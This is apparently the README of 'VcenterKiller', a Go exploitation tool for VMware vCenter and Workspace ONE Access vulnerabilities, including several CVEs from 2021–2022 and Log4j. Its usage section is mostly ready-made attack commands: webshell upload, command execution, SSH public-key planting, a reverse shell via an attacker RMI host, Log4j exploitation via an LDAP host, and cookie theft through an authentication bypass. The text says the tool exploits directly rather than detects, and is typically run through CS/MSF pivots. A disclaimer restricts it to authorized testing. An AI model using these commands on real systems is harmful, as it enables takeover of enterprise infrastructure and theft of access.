
![vckiller](https://socialify.git.ci/Schira4396/VcenterKiller/image?description=1&descriptionEditable=%E4%B8%80%E6%AC%BE%E9%92%88%E5%AF%B9Vcenter%E7%9A%84%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7&font=Inter&forks=1&issues=1&language=1&name=1&owner=1&pattern=Plus&stargazers=1&theme=Light)

# VcenterKiller

#### -1.注意

在本地搭建漏洞环境的兄弟，用vckiller验证log4j基本上会失败，因为在Vmware 虚拟机环境下用NAT模式的话，验证模块中的出口网卡会被判定为127.0.0.1，这样目标访问的LDAP Server地址就变成了127.0.0.1，验证就失败了😏

#### 0.必读
如果遇到bug请提issue，写这个工具单纯是为了方便，它没有什么高大上的东西
本工具使用go-1.18构建



#### 1.它是什么

一款针对Vcenter的综合**验证**工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-22005，提供一键上传webshell，命令执行或者上传公钥并使用SSH连接的功能，以及针对Apache Log4j CVE-2021-44228漏洞在Vcenter上的检测以及利用，比如命令执行并获取回显（~~需要一个ldap恶意服务器~~），现在不需要另外启动ldap服务器了，我根据jndi-injection工具手搓了一个利用方式，Vcenter使用的中间件是Tomcat，直接使用TomcatBypass的利用链就行了。

#### 2.它的定位

一般Vcenter都放在内网，并且漏洞特征也都是烂大街，像什么fscan啦一扫就出来了，那么VcenterKiller就不是用来检测目标是否存在漏洞的，而是直接尝试利用，一般通过CS/MSF在跳板上来执行，所以去掉了其余花里胡哨的输出。

为什么用GO，因为Python写起来方便但是用起来很蛋疼，各种依赖库，并且编译出来体积太大，C#没法跨平台，写到一半扔了。

#### 3.使用方法

```bash
go build -o main.exe

./main.exe -u https://192.168.1.1 -m 21985 -c whoami
./main.exe -u https://192.168.1.1 -m 22005 -f test.jsp
./main.exe -u https://192.168.1.1 -m 21972 -f test.jsp
./main.exe -u https://192.168.1.1 -m 21972 -f id_rsa.pub -t ssh //传公钥
./main.exe -u https://192.168.1.1 -m 21985 -t rshell -r rmi://xx.xx.xx.xx:1099/xx
./main.exe -u https://192.168.1.1 -m log4center -t scan // scan log4j
./main.exe -u https://192.168.1.1 -m log4center -t exec -r ldap://xx.xx.xx.xx:1389 -c whoami //也可以不指定ldap服务
./main.exe -u https://xx.xx.com -m 22954 whoami
./main.exe -u https://xx.xx.com -m 22972 //get cookie
./main.exe -u https://xx.xx.com -m 31656 //If CVE-2022-22972不能用就换CVE-2022-31656
```

#### 4.免责声明

本工具仅面向**合法授权**的企业安全建设行为，例如企业内部攻防演练、漏洞验证和复测，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标使用。**

如您在使用本工具的过程中存在任何非法行为，**您需自行承担相应后果**，我们将不承担任何法律及连带责任。

#### 5.更新日志

```bash
V1.0 上线
V1.1 针对CVE-2021-21985添加了利用rmi反弹shell的功能，前提是你要启动一个rmi服务器，例如jndi-injection-exploit
V1.2 增加了针对Vcenter的log4j检测和验证能力
V1.3 增加了对Vmware WorkSpace One Access的漏洞验证功能，包括CVE-2022-22954 远程命令执行；CVE-2022-22972、CVE-2022-31656身份鉴别绕过
V1.3.1 修复了检测log4j时忽略了端口的问题，有的服务会更改默认的443端口
V1.3.2 修改了针对log4j的利用方式，通过tomcatbypassEcho的方式执行命令并获取回显。vcenter 7.0 linux测试通过。
V1.3.3 增加了对6.7和7.0版本的区别利用，7.0必须使用tomcatbypass，而6.7使用普通的basic就行了
v1.3.4 修改了对log4j的验证逻辑，目前的逻辑是循环5次不同payload无差别乱打，有回显就有，没有就没有
v1.3.5 消除了log4j对Jndi-Injection-Exploit的依赖，能够直接执行命令并获取回显
v1.3.6 针对21972的ssh功能进行了修改并优化了其他细节
v1.3.7 修改了bug
...
```

